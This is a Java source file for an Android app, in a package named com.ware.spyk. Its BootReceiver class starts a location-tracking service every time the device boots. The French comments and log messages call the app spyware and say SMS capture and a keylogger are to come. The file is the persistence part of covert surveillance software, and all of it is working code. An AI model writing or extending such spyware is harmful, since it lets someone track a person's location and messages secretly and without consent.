package com.ware.spyk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d("BootReceiver", "Démarrage détecté, lancement du spyware.");

            // Démarre directement le service GPS (et plus tard, SMS, keylogger, etc.)
            Intent serviceIntent = new Intent(context, LocalisationService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Log.d("BootReceiver", "Démarrage du service en foreground.");
                context.startForegroundService(serviceIntent); // Android 8+ : Obligatoire
            } else {
                Log.d("BootReceiver", "Démarrage du service en background.");
                context.startService(serviceIntent);
            }
        }
    }
}
